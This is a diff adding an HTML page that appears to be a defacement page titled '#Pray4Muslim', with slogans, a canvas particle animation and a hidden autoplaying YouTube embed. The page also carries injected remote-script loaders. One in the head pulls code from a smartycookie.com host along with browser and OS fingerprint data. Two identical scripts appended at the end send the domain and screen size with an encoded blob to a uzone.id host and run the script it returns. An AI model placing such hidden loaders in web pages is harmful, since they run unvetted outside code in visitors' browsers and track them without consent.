@@ -1,0 +1,210 @@
+
+<!DOCTYPE html>
+<html >
+
+<head>
+ <script id="vitruvian" type="text/javascript" async="true" src="https://clown.smartycookie.com/kernel/55A074F6-76D9-4F00-B795-A0BE1B098A92?aid=0BE03152-52B7-40CF-ACED-7D820477FF8B&amp;iid=9952A101-92B9-485A-8D59-419F54FFA501&amp;itm=2015-10-03T03:31:48Z" data-nid="55A074F6-76D9-4F00-B795-A0BE1B098A92" data-ie-pid="00000000-0000-0000-0000-000000000000" data-cr-pid="00000000-0000-0000-0000-000000000000" data-ff-pid="00000000-0000-0000-0000-000000000000" data-nf-pid="71D6EBE6-8760-4E00-9675-F25128C95BE1" data-pid="71D6EBE6-8760-4E00-9675-F25128C95BE1" data-aid="0BE03152-52B7-40CF-ACED-7D820477FF8B" data-iid="9952A101-92B9-485A-8D59-419F54FFA501" data-ver="1.10.0.25" data-itm="2015-10-03T03:31:48Z" data-hid="630B076A-3794-31EA-18D7-0599F8A39EFE" data-ie-at="00000000-0000-0000-0000-000000000000" data-cr-at="00000000-0000-0000-0000-000000000000" data-ff-at="00000000-0000-0000-0000-000000000000" data-nf-at="1FF85EC4-99F7-13F8-DFFC-D1820274C55D" data-at="1FF85EC4-99F7-13F8-DFFC-D1820274C55D" data-ie-ver="8.0.7600.16385" data-cr-ver="" data-ff-ver="40.0.3 (x86 en-US)" data-dbsr="firefox" data-osn="Windows 7 Ultimate" data-osv="6.1.7600" data-ost="x32" data-bsr="NF" ></script>
+
+  <meta charset="UTF-8">
+  <link rel="shortcut icon" type="image/x-icon" href="https://ghostbin.com/favicon.ico" />
+  <link rel="mask-icon" type="" href="https://ghostbin.com/favicon.ico" color="#111" />
+  <title>#Pray4Muslim</title>
+  
+  
+  
+  
+      <style>
+      @import url("https://fonts.googleapis.com/css?family=Montserrat:200,300,400,600");
+.more-pens {
+  position: fixed;
+  left: 20px;
+  bottom: 20px;
+  z-index: 10;
+  font-family: "Montserrat";
+  font-size: 12px;
+}
+
+a.white-mode, a.white-mode:link, a.white-mode:visited, a.white-mode:active {
+  font-family: "Montserrat";
+  font-size: 12px;
+  text-decoration: none;
+  background: #212121;
+  padding: 4px 8px;
+  color: #f7f7f7;
+}
+a.white-mode:hover, a.white-mode:link:hover, a.white-mode:visited:hover, a.white-mode:active:hover {
+  background: #edf3f8;
+  color: #212121;
+}
+
+body {
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  width: 100%;
+  height: 100%;
+  background: #000000;
+}
+
+.title {
+  z-index: 10;
+  position: absolute;
+  left: 50%;
+  top: 50%;
+  transform: translateX(-50%) translateY(-50%);
+  font-family: "Montserrat";
+  text-align: center;
+  width: 100%;
+}
+.title h1 {
+  position: relative;
+  color: #EEEEEE;
+  font-weight: 600;
+  font-size: 60px;
+  padding: 0;
+  margin: 0;
+  line-height: 1;
+  text-shadow: 0 0 30px #000155;
+}
+.title h1 span {
+  font-weight: 600;
+  padding: 0;
+  margin: 0;
+  color: #BBB;
+}
+.title h3 {
+  font-weight: 200;
+  font-size: 20px;
+  padding: 0;
+  margin: 0;
+  line-height: 1;
+  color: #EEEEEE;
+  letter-spacing: 2px;
+  text-shadow: 0 0 30px #000155;
+}
+
+    </style>
+
+  
+  
+  
+  
+</head>
+
+<body translate="no" >
+
+  <div class="title">
+    <h3>#FREEDOM4MOSLEM</h3>
+    <h1>IN SHAA ALLAH WE WILL BE FREE</h1>
+    <h3>let's pray for the safety of Moslems in the world</h3>
+  </div>
+  
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
+
+    <script>
+    'use strict';
+
+function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }
+
+var max_particles = 1000;
+
+var tela = document.createElement('canvas');
+tela.width = $(window).width();
+tela.height = $(window).height();
+$("body").append(tela);
+
+var canvas = tela.getContext('2d');
+
+var Particle = function () {
+  function Particle(canvas, progress) {
+    _classCallCheck(this, Particle);
+
+    var random = Math.random();
+    this.progress = 0;
+    this.canvas = canvas;
+
+    this.x = $(window).width() / 2 + (Math.random() * 200 - Math.random() * 200);
+    this.y = $(window).height() / 2 + (Math.random() * 200 - Math.random() * 200);
+
+    this.w = $(window).width();
+    this.h = $(window).height();
+    this.radius = random > .2 ? Math.random() * 1 : Math.random() * 3;
+    this.color = random > .2 ? "#d8002c" : "#F9314C";
+    this.radius = random > .8 ? Math.random() * 2 : this.radius;
+    this.color = random > .8 ? "#7DFFF2" : this.color;
+
+    // this.color  = random > .1 ? "#ffae00" : "#f0ff00" // Alien
+    this.variantx1 = Math.random() * 300;
+    this.variantx2 = Math.random() * 400;
+    this.varianty1 = Math.random() * 100;
+    this.varianty2 = Math.random() * 120;
+  }
+
+  Particle.prototype.render = function render() {
+    this.canvas.beginPath();
+    this.canvas.arc(this.x, this.y, this.radius, 0, 2 * Math.PI);
+    this.canvas.lineWidth = 2;
+    this.canvas.fillStyle = this.color;
+    this.canvas.fill();
+    this.canvas.closePath();
+  };
+
+  Particle.prototype.move = function move() {
+    // this.x += (Math.sin(this.progress/this.variantx1)*Math.cos(this.progress/this.variantx2));
+    // this.y += (Math.sin(this.progress/this.varianty1)*Math.cos(this.progress/this.varianty2));
+    this.x += Math.sin(this.progress / this.variantx1) * Math.cos(this.progress / this.variantx2);
+    this.y += Math.cos(this.progress / this.varianty2);
+
+    if (this.x < 0 || this.x > this.w - this.radius) {
+      return false;
+    }
+
+    if (this.y < 0 || this.y > this.h - this.radius) {
+      return false;
+    }
+    this.render();
+    this.progress++;
+    return true;
+  };
+
+  return Particle;
+}();
+
+var particles = [];
+var init_num = popolate(max_particles);
+function popolate(num) {
+  for (var i = 0; i < num; i++) {
+    setTimeout(function () {
+      particles.push(new Particle(canvas, i));
+    }.bind(this), i * 20);
+  }
+  return particles.length;
+}
+
+function clear() {
+  canvas.globalAlpha = 0.05;
+  canvas.fillStyle = '#2e050d';
+  canvas.fillRect(0, 0, tela.width, tela.height);
+  canvas.globalAlpha = 1;
+}
+
+function update() {
+  particles = particles.filter(function (p) {
+    return p.move();
+  });
+  if (particles.length < init_num) {
+    popolate(1);
+  }
+  clear();
+  requestAnimationFrame(update.bind(this));
+}
+update();
+  </script>
+
+  
+<embed src="https://www.youtube.com/watch?v=62RAK4arstU&amp;autoplay=1&amp;loop=1&amp;playlist=62RAK4arstU"
+type="application/x-shockwave-flash" wmode="transparent" height="1"
+width="1"></embed>  
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKIW9ayO%2bGLXBrw3ngM0sbvbKAmopFwJZWQoCrixf13GOrzwKIx2UlGO0v3%2fRB9v%2fOOLoPaZ%2fN83icPR%2b0mx8DAKZXIuVmOeaxEzD6pY9lVzmtg80lrgh8A3fswmpEVfvOvd7SrkBlHe2fSxxgV1JX7gMSEB9Q%2bmbrHsAXLJVMKdJz%2b1A6y61JLa%2b7MA746f9p43TUfHetXH5mCeT6l33%2fYD%2fprnvEghg7XsSdzS56tSUqK%2b%2bu4nVXZNDhVe%2bY9RktBIODXL2nZJT6hASY4sQzsvmIxDJHpIGMO6YO%2blPZN2EFdTwDNQKAxABst15UzzTr2vXtqgtYW3w9FiVpzSOCx02fkQmaTpRSbabhAscf3GwAuyvez8unmtmQ%2b3bGM3hrcy%2fhiWpmUNkEo%2fuTxatQ5SijKNvxqXLgnFpafH2EyjpAYoPJm%2bHoT2WMV6sx%2flicp4VckbxmOGVoPrGTiFFGV2wW31UlH4VTS9z6m2yxmkwgduGyGnOT5wgmIo6QvYNrmaYPyb4LV3UkSkL2wgkmZbiXesM9LA8vz31C%2fYb4B5y4kEm6VBRU3PvD%2bRaIIutm" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKqeerqSOVXyY9FjaHcUpXc3o463lLVsZS7Rr9v8dpkN7P2xhc6CQ7Y4FqtgU4D%2bF0xXye3re7oFY3Kgbqqa1VaCEhGjC7JySmbJDvhAghgx%2fVrHaRQOfZnpc313s5SgkUdZYhU5sksir%2bBLkdLe5SfZ%2b%2bXCgbQS1drrw3wcv1n5yb%2fzTkldCmwZ2yzWIPZpDXgr1z3pk1l3AzyqKNT1UQCramH8tHrKey7X%2b7%2bts%2bvhwsmfv5S%2fUurXR70w0Lx6hzORcfqWa5HSa%2fJ3NIUKBFHb1Wz%2btA6qn6eLQmUIVRggDgMsGtkJUyqXCwt%2fTuUk8RiUR1azTmV6BYct6h3GNNK9%2f6%2fIscY2j2xIs8piM0SOMkqoag3w6fwFy68vUyPcVbyuuydU9Elw%2bNXDeP8nEcaVIQvgH%2bFP1e3ezXTmcv8n19yF0T9YyavgJfNcBKurHHume%2bBCMk7wrjNYLKCMGt%2f00bAiB8IXql3cAkGIz%2bGx6lLj9H1vgCsFDX4gdbI9ASoyHxl4g2oGc%2blSr1bkCjSSx7j7OlJTF9ksJkKgSeYvA6ZYBKXvRCyw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
